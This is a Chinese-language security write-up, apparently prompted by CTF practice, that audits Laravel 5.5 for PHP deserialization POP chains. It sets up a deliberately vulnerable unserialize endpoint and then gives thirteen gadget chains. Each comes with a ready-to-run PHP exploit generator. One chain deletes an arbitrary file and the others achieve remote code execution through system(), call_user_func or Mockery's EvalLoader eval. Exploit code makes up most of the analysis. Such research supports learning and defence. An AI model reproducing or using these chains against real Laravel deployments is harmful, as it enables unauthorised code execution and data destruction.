# 前言
做 web 类题目的时候发现 ctfshow 平台中 web 入门题目中有关于`PHP 框架漏洞`的题目，尝试自己挖掘链子，进一步学习在框架类中反序列化的链子挖掘方式。

# 前置知识
## 定义
序列化（串行化）：是将变量转换为可保存或传输的字符串的过程；
反序列化（反串行化）：就是在适当的时候把这个字符串再转化成原来的变量使用；
这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性；
常见的php序列化和反序列化方式主要有：serialize，unserialize

## 常见的魔术方法
```
__construct()，类的构造函数
__destruct()，类的析构函数
__call()，在对象中调用一个不可访问方法时调用
__callStatic()，用静态方式中调用一个不可访问方法时调用
__get()，获得一个类的成员变量时调用
__set()，设置一个类的成员变量时调用
__isset()，当对不可访问属性调用isset()或empty()时调用
__unset()，当对不可访问属性调用unset()时被调用
__sleep()，执行serialize()时，先会调用这个函数
__wakeup()，执行unserialize()时，先会调用这个函数
__toString()，类被当成字符串时的回应方法
__invoke()，调用函数的方式调用一个对象时的回应方法
__set_state()，调用var_export()导出类时，此静态方法会被调用
__clone()，当对象复制完成时调用
__autoload()，尝试加载未定义的类
__debugInfo()，打印所需调试信息
```

## 寻找方式
寻找反序列化链子的常用思路是全局搜索`__destruct()`方法、`__wakeup()`方法或者直接搜索 `unserialize()`方法

# 漏洞范围
Laravel <= 5.5

# 环境搭建
## 源码下载
之前进行`ThinkPHP6.x`代码审计的时候通过`composer`拉取的源码没法打通挖掘的链子，这里为了避免这个问题，在网上直接找了一份之前的`Laravel5.5`的源码，[下载链接](https://anonfiles.com/j5edufSaud/laravel55_zip)
## 环境部署
在`routes/web.php`中添加路由

```php
Route::get('/', "DemoController@demo");
```

在`app/Http/Controllers`目录下添加控制器

```php
<?php
namespace App\Http\Controllers;

use Illuminate\Http\Request;
class DemoController extends Controller
{
    public function demo()
    {
        highlight_file(__FILE__);
        if(isset($_GET['data'])){
            $filename = "C:\Tools\phpstudy_pro\WWW\laravel55\public\info.php";
            @unserialize(base64_decode($_GET['data']));
            if(file_exists($filename)){
                echo $filename." is exit!".PHP_EOL;
            }else{
                echo $filename." has been deleted!".PHP_EOL;
            }
        }
    }
}
```
将源码用小皮面板进行搭建，访问`http://127.0.0.1/laravel55/public/index.php`，出现如下页面则说明环境部署成功

![undefined](https://p5.ssl.qhimg.com/t01ca00faceddc23d63.png "undefined")

# 漏洞分析
## POP链-1(任意文件删除漏洞)
跟进`Pipes/WindowsPipes.php`中的`__destruct()`方法，发现其调用了一个`removeFiles()`方法，跟进去后发现是一个简单的任意文件删除漏洞

![undefined](https://p0.ssl.qhimg.com/t01ac4cd5acefa47ad3.png "undefined")

### exp

```php
<?php
namespace Symfony\Component\Process\Pipes {
    class WindowsPipes {
        private $files = array();
        function __construct() {
            $this->files = array("C:/Tools/phpstudy_pro/WWW/laravel51/public/info.php");
        }
    }
    echo base64_encode(serialize(new WindowsPipes()));
}
?>
```

![](https://p2.ssl.qhimg.com/t01e9d1c102c6fa2130.png)

![](https://p0.ssl.qhimg.com/t01ad3b15be7188726f.png)

## POP链-2
跟进`src/Illuminate/Broadcasting/PendingBroadcast.php`中的`__destruct()`方法，发现`$this->events`和`$this->event`都是可控的，因此可以寻找一个`__call()`方法或者`dispatch()`方法来进行利用

先用`__call()`来做突破点，跟进`src/Faker/Generator.php`中的`__call()`方法，发现其调用了`format()`方法，进而调用`getFormatter()`方法

![](https://p3.ssl.qhimg.com/t01693e24f56c873248.png)

由于`getFormatter()`方法中的`$this->formatters[$formatter]`是可控的并直接 return 回上一层，因此可以利用该可控参数来进行命令执行 RCE 操作

### exp
```php
<?php
namespace Illuminate\Broadcasting {
    class PendingBroadcast {
        protected $events;
        protected $event;
        function __construct($events="", $event="") {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct($func="") {
            $this->formatters = ['dispatch' => $func];
        }
    }
}

namespace {
    $demo1 =  new Faker\Generator("system");
    $demo2 = new Illuminate\Broadcasting\PendingBroadcast($demo1, "calc");
    echo base64_encode(serialize($demo2));
}
?>
```
### POP链利用流程图

![](https://p4.ssl.qhimg.com/t01fd65d2d1dcf5a1ee.png)

## POP链-3
继续上面寻找可用的`__call()`方法，跟进`src/Illuminate/Validation/Validator.php`中的`__call()`方法，先进行字符串的操作截取`$method`第八个字符之后的字符，由于传入的字符串是`dispatch`，正好八个字符所以传入后为空，接着经过 if 逻辑调用`callExtension()`方法，触发`call_user_func_array`方法

![undefined](https://p4.ssl.qhimg.com/t01efbb54c2cba095e0.png "undefined")

### exp
```php
<?php
namespace Illuminate\Validation {
    class Validator {
       public $extensions = [];
       public function __construct() {
            $this->extensions = ['' => 'system'];
       }
    }
}

namespace Illuminate\Broadcasting {
    use  Illuminate\Validation\Validator;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct($cmd)
        {
            $this->events = new Validator();
            $this->event = $cmd;
        }
    }
    echo base64_encode(serialize(new PendingBroadcast('calc')));
}
?>
```
### POP链利用流程图
![](https://p0.ssl.qhimg.com/t01ddaee826a4457217.png)

## POP链-4
跟进`src/Illuminate/Support/Manager.php`中的`__call()`方法，其调用`driver()`方法

![](https://p1.ssl.qhimg.com/t01c6ae4cbc19ab85f4.png "undefined")

跟进`createDriver()`方法，当`$this->customCreators[$driver]`存在时调用`callCustomCreator()`方法，进一步跟进`callCustomCreator()`方法，发现`$this->customCreators[$driver]`和`$this->app)`均是可控的，因此可以触发 RCE

![](https://p0.ssl.qhimg.com/t011e21a2d3da39647d.png "undefined")

### exp
```php
<?php
namespace Illuminate\Notifications {
    class ChannelManager {
        protected $app;
        protected $customCreators;
        protected $defaultChannel;
        public function __construct() {
            $this->app = 'calc';
            $this->defaultChannel = 'H3rmesk1t';
            $this->customCreators = ['H3rmesk1t' => 'system'];
        }
    }
}


namespace Illuminate\Broadcasting {
    use  Illuminate\Notifications\ChannelManager;
    class PendingBroadcast {
        protected $events;
        public function __construct()
        {
            $this->events = new ChannelManager();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```
### POP链利用流程图

![](https://p1.ssl.qhimg.com/t01897b941b5103d8dc.png "undefined")

## POP链-5
大致看了一遍`__call()`方法基本没有利用的地方了(太菜了找不到)，开始跟一下`dispath()`方法

![undefined](https://p0.ssl.qhimg.com/t01b2b0557300f7f989.png "undefined")

先跟进`src/Illuminate/Events/Dispatcher.php`中的`dispatch()`方法，注意到`$listener($event, $payload)`，尝试以这个为突破口来实现 RCE

![](https://p5.ssl.qhimg.com/t01882a2ac886bde391.png "undefined")

看看`$listener`的值是如何来的，跟进`getListeners()`方法，这里可以先通过可控变量`$this->listeners[$eventName]`来控制`$listener`的值，接着进入数组合并函数，调用`getWildcardListeners()`方法，跟进去看一下，这里保持默认设置执行完之后会返回`$wildcards = []`，接着回到数组合并函数合并之后还是`$this->listeners[$eventName]`的值，接着进入`class_exists()`函数，这里由于并不会存在一个命令执行函数的类名，因此可以依旧还是返回`$this->listeners[$eventName]`的值

![undefined](https://p4.ssl.qhimg.com/t014aca56b2a02516aa.png "undefined")

控制了`$listener`的取值之后，将传入的`$event`的值作为命令执行函数的参数值即可来进行 RCE 操作

### exp
```php
<?php
namespace Illuminate\Events {
    class Dispatcher {
        protected $listeners = [];
        public function __construct() {
            $this->listeners = ["calc" => ["system"]];
        }
    }
}



namespace Illuminate\Broadcasting {
    use  Illuminate\Events\Dispatcher;
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = "calc";
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```
### POP链利用流程图

![undefined](https://p3.ssl.qhimg.com/t0168ad9a2bff687e2f.png "undefined")

## POP链-6
继续跟`dispatch()`方法，跟进`src/Illuminate/Bus/Dispatcher.php`中的`dispatch()`方法，注意到该方法如果 if 语句判断为 true 的话，会进入`dispatchToQueue()`方法，跟进`dispatchToQueue()`方法发现`call_user_func()`方法

![undefined](https://p3.ssl.qhimg.com/t01e6a9a1a6100e9667.png "undefined")

先看看怎么使得进入 if 语句的循环中，首先`$this->queueResolver`是可控的，跟进`commandShouldBeQueued()`方法，这里判断`$command`是否是`ShouldQueue`的实现，即传入的`$command`必须是`ShouldQueue`接口的一个实现，而且`$command`类中包含`connection`属性

![](https://p4.ssl.qhimg.com/t01367152dbc7f202a2.png "undefined")

这里找到两个符合条件的类`src/Illuminate/Notifications/SendQueuedNotifications.php`中的`SendQueuedNotifications`类和`src/Illuminate/Broadcasting/BroadcastEvent.php`中的`BroadcastEvent`类，当类是 use 了 trait 类，同样可以访问其属性，这里跟进`src/Illuminate/Bus/Queueable.php`

![undefined](https://p3.ssl.qhimg.com/t01e456ca37067ba2e3.png "undefined")

![undefined](https://p0.ssl.qhimg.com/t017b7422608496417f.png "undefined")

![undefined](https://p4.ssl.qhimg.com/t01f999c8bef616f299.png "undefined")

### exp
```php
<?php
namespace Illuminate\Bus {
    class Dispatcher {
        protected $queueResolver = "system";
    }
}

namespace Illuminate\Broadcasting {
    use  Illuminate\Bus\Dispatcher;
    class BroadcastEvent {
        public $connection;
        public $event;
        public function __construct() {
            $this->event = "calc";
            $this->connection = $this->event;
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```
### POP链利用流程图

![undefined](https://p5.ssl.qhimg.com/t0128e03ec10214febd.png "undefined")

## POP链-7
继续接着上一条链子的`call_user_func()`方法往后，由于这里变量是可控的，因此可以调用任意类的方法，跟进`library/Mockery/Loader/EvalLoader.php`中的`load()`方法，这里如果不进入 if 循环从而触发到`getCode()`方法即可造成任意代码执行漏洞

![undefined](https://p4.ssl.qhimg.com/t016931a8ff7a493d3a.png "undefined")

看看 if 循环的判断条件，一路跟进调用，由于最后的`$this->name`是可控的，因此只需要给它赋一个不存在的类名值即可，可利用的`getName()`方法比较多，选一个能用的就行

![undefined](https://p2.ssl.qhimg.com/t01cd6d0337cb7b6592.png "undefined")

![undefined](https://p0.ssl.qhimg.com/t01a97a79073d0c1170.png "undefined")

### exp-1
```php
<?php
namespace Mockery\Generator {
    class MockConfiguration {
        protected $name = 'H3rmesk1t';
    }
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct() {
            $this->config = new MockConfiguration();
            $this->code = "<?php system('calc');?>";
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition();
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```

### exp-2
```php
<?php
namespace Symfony\Component\HttpFoundation {
    class Cookie {
        protected $name = "H3rmesk1t";
    }
}

namespace Mockery\Generator {
    use Symfony\Component\HttpFoundation\Cookie;
    class MockDefinition {
        protected $config;
        protected $code;
        public function __construct($code) {
            $this->config = new Cookie();
            $this->code = $code;
        }
    }
}

namespace Mockery\Loader {
    class EvalLoader {}
}

namespace Illuminate\Bus {
    use Mockery\Loader\EvalLoader;
    class Dispatcher {
        protected $queueResolver;
        public function __construct() {
            $this->queueResolver = [new EvalLoader(), 'load'];
        }
    }
}

namespace Illuminate\Broadcasting {
    use Illuminate\Bus\Dispatcher;
    use Mockery\Generator\MockDefinition;
    class BroadcastEvent {
        public $connection;
        public function __construct() {
            $this->connection = new MockDefinition("<?php system('calc');?>");
        }
    }
    class PendingBroadcast {
        protected $events;
        protected $event;
        public function __construct() {
            $this->events = new Dispatcher();
            $this->event = new BroadcastEvent();
        }
    }
    echo base64_encode(serialize(new PendingBroadcast()));
}
?>
```
### POP链利用流程图

![undefined](https://p4.ssl.qhimg.com/t016d292a9d69431ac1.png "undefined")

## POP链-8
跟进`lib/classes/Swift/KeyCache/DiskKeyCache.php`中的`__destruct()`方法，这里的`$this->_keys`是可控的

![undefined](https://p3.ssl.qhimg.com/t013ca6184c5c91be9d.png "undefined")

继续看看 foreach 中调用的`clearAll()`方法，当`array_key_exists()`判断为 true 时进入 foreach，接着调用`clearKey()`方法，进入 if 判断后调用`hasKey()`方法，由于这里的`$this->_path`是可控的，因此可以给其赋值为一个类名从而触发该类中的`__toString()`方法

![undefined](https://p4.ssl.qhimg.com/t012a9c30fd94199e4b.png "undefined")

这里可以选择`library/Mockery/Generator/DefinedTargetClass.php`中的`__toString()`方法作为触发的点，其先会调用`getName()`方法，且该方法中的`$this->rfc`是可控的，因此可以来触发一个没有`getName()`方法的类从而来触发该类中的`__call()`方法

![undefined](https://p5.ssl.qhimg.com/t014698c2b0cbc67092.png "undefined")

全局搜索`__call()`方法，跟进`src/Faker/ValidGenerator.php`中的`__call()`方法，其 while 语句内的`$this->validator`是可控的，当`$res`能够是命令执行函数的参数时即可触发命令执行 RCE，由于`$this->generator`也是可控的，因此可以寻找一个能够有返回参数值的方法类来达到返回命令执行函数参数的目的从而 RCE

![undefined](https://p0.ssl.qhimg.com/t017d6656e10983d2b4.png "undefined")

这里可以用`src/Faker/DefaultGenerator.php`来做触发点，当前面设置的方法不存在时这里就会触发到`__call()`方法，从而返回可控参数`$this->default`的值
 
![undefined](https://p1.ssl.qhimg.com/t01a495401089c8e278.png "undefined")

### exp
```php
<?php 
namespace Faker {
    class DefaultGenerator {
        protected $default;
        public function __construct($payload) {
            $this->default = $payload;
        }
    }
    class ValidGenerator {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($payload) {
            $this->generator = new DefaultGenerator($payload);
            $this->validator = "system";
            $this->maxRetries = 1; // 不设置值的话默认是重复10000次
        }
    }
}

namespace Mockery\Generator {
    use Faker\ValidGenerator;
    class DefinedTargetClass {
        private $rfc;
        public function __construct($payload) {
            $this->rfc = new ValidGenerator($payload);
        }
    }
}

namespace {
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new DefinedTargetClass($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP链利用流程图

![undefined](https://p3.ssl.qhimg.com/t01d3043fe36903dc33.png "undefined")

## POP链-9
起始点和终点的利用链和`POP链-8`一样，将`__toString()`的触发点变一下，跟进`lib/classes/Swift/Mime/SimpleMimeEntity.php`中的`__toString()`方法，其调用了`toString()`方法，由于`$this->_headers`是可控的，因此可以接上上一条链子的`__call()`方法利用进行 RCE 操作

![undefined](https://p5.ssl.qhimg.com/t0159a7d1c51ac10591.png "undefined")

### exp
```php
<?php 
namespace Faker {
    class DefaultGenerator {
        protected $default;
        public function __construct($payload) {
            $this->default = $payload;
        }
    }
    class ValidGenerator {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct($payload) {
            $this->generator = new DefaultGenerator($payload);
            $this->validator = "system";
            $this->maxRetries = 1; // 不设置值的话默认是重复10000次
        }
    }
}

namespace {
    use Faker\ValidGenerator;
    class Swift_Mime_SimpleMimeEntity {
        private $headers;
        public function __construct($payload) {
            $this->headers = new ValidGenerator($payload);
        }
    }
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new Swift_Mime_SimpleMimeEntity($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP链利用流程图

![undefined](https://p3.ssl.qhimg.com/t01ef5842b0f04120d0.png "undefined")

## POP链-10
起始点和`POP链-8`一样，从`__toString()`开始，跟进`src/Prophecy/Argument/Token/ObjectStateToken.php`中的`__toString()`方法，这里`$this->util`和`$this->value`均可控

![undefined](https://p0.ssl.qhimg.com/t01c53ae21f69eebfb4.png "undefined")

接着后面利用`POP链-2`后半段的`__call()`触发方法即可进行命令执行操作从而达到 RCE

### exp
```php
<?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ObjectStateToken {
        private $name;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = "H3rmesk1t";
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ObjectStateToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new ObjectStateToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP链利用流程图

![undefined](https://p0.ssl.qhimg.com/t01c318e6f5ac9a107c.png "undefined")

## POP链-11
起始点和终点的利用链和`POP链-10`一样，将`__toString()`的触发点变一下，跟进`src/Prophecy/Argument/Token/IdenticalValueToken.php`中的`__toString()`方法，这里`$this->string`、`$this->util`和`$this->value`均可控

![undefined](https://p3.ssl.qhimg.com/t0114475595f218992c.png "undefined")

### exp
```php
<?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class IdenticalValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = null;
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\IdenticalValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new IdenticalValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP链利用流程图

![undefined](https://p0.ssl.qhimg.com/t01b6ad60364791668b.png "undefined")

## POP链-12
起始点和终点的利用链和`POP链-10`一样，将`__toString()`的触发点变一下，跟进`src/Prophecy/Argument/Token/ExactValueToken.php`中的`__toString()`方法，这里`$this->string`、`$this->util`和`$this->value`均可控

![undefined](https://p0.ssl.qhimg.com/t01791efaeaeeaa72ec.png "undefined")

### exp
```php
<?php 
namespace Faker {
    class Generator {
        protected $formatters = array();
        function __construct() {
            $this->formatters = ['stringify' => "system"];
        }
    }
}

namespace Prophecy\Argument\Token {
    use Faker\Generator;
    class ExactValueToken {
        private $string;
        private $value;
        private $util;
        public function __construct($payload) {
            $this->name = null;
            $this->util = new Generator();;
            $this->value = $payload;
        }
    }
}

namespace {
    use Prophecy\Argument\Token\ExactValueToken;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new ExactValueToken($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP链利用流程图

![undefined](https://p0.ssl.qhimg.com/t018e7431dc08dd992c.png "undefined")

## POP链-13
前半段链子和之前的其它链子一样都行，只要能触发到`__call()`方法)，接着跟进`src/Illuminate/Database/DatabaseManager.php`中的`__call()`方法，其调用了`connection()`方法，跟进去，这里要让其进入`makeConnection()`方法从而来利用`call_user_func()`方法来进行 RCE

![undefined](https://p1.ssl.qhimg.com/t01041c2aa66c1f1cad.png "undefined")

![undefined](https://p0.ssl.qhimg.com/t01484d0c48b1130516.png "undefined")

跟进`getConfig()`方法，继续跟进`Arr::get($connections, $name)`，可以看到经过`get()`方法返回回来的`$config`的值是可控的，可以将命令执行函数返回回来，从而导致 RCE

![undefined](https://p0.ssl.qhimg.com/t01d87acb0b55e8f265.png "undefined")

![undefined](https://p5.ssl.qhimg.com/t014d438b111c23f23c.png "undefined")

### exp
```php
<?php 
namespace Illuminate\Database{
    class DatabaseManager{
        protected $app;
        protected $extensions ;
        public function __construct($payload)
        {
            $this->app['config']['database.default'] = $payload;
            $this->app['config']['database.connections'] = [$payload => 'system'];
            $this->extensions[$payload]='call_user_func';
        }
    }
}

namespace Mockery\Generator {
    use Illuminate\Database\DatabaseManager;
    class DefinedTargetClass {
        private $rfc;
        public function __construct($payload) {
            $this->rfc = new DatabaseManager($payload);
        }
    }
}

namespace {
    use Mockery\Generator\DefinedTargetClass;
    class Swift_KeyCache_DiskKeyCache {
        private $path;
        private $keys = ['H3rmesk1t' => ['H3rmesk1t' => 'H3rmesk1t']];
        public function __construct($payload) {
            $this->path = new DefinedTargetClass($payload);
        }
    }
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache("calc")));
}
?>
```
### POP链利用流程图

![undefined](https://p1.ssl.qhimg.com/t01e9eeb38689dddbee.png "undefined")
